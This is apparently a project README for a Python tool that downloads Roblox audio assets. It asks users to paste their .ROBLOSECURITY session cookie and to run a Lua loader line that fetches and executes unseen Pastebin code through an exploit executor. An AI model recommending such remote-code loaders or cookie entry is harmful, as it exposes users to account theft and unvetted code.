# Roblox Audio Fetcher Downloader

A CLI tool to download audio assets from Roblox using asset IDs and place ID.

> **Note:** We recommend using a Roblox alternate account (alt) and its corresponding `.ROBLOSECURITY` cookie to avoid potential security and privacy risks.

> **For Roblox Script Execution:**
> If you'd like to use this script, you can execute the provided Lua script in your game. Use the following command in any Roblox exploit executor:
>
> ```lua
> loadstring(game:HttpGet('https://pastebin.com/raw/q1BeVNMG', true))()
> ```
>
> If you have concerns about the script's safety, you can visit the [Pastebin URL](https://pastebin.com/raw/q1BeVNMG) directly to review the code.

> **Need Help?**
> If you require assistance or have questions about using the tool, refer to the detailed instructions provided in the [howto.txt](howto.txt) file.

> **Important:** The Place ID must have associated audio assets (Audio ID/Asset ID) connected to it.

> **Video Tutorial:** Watch the full setup and usage guide [here](https://www.youtube.com/watch?v=7jmCUQoU7ac).

---

## Table of Contents
- [Usage](#usage)
- [Requirements](#requirements)
- [License](#license)

---

## Usage

1. **Clone or download the repository.**

2. **Install the required packages:**
   ```bash
   pip install requests colorama
   ```

3. **Run the script:**
   ```bash
   python audio.py
   ```

4. **Provide inputs in the terminal:**
   - Enter your Roblox cookie (`.ROBLOSECURITY`).
   - Enter the target Place ID.
   - Provide a list of asset IDs separated by commas.

5. **Audio files will be saved in the `audio_files` folder.**

---

## Requirements
- Python 3.x
- `colorama` (for colored output)
- `requests` library

---

## License
This project is licensed under the MIT License.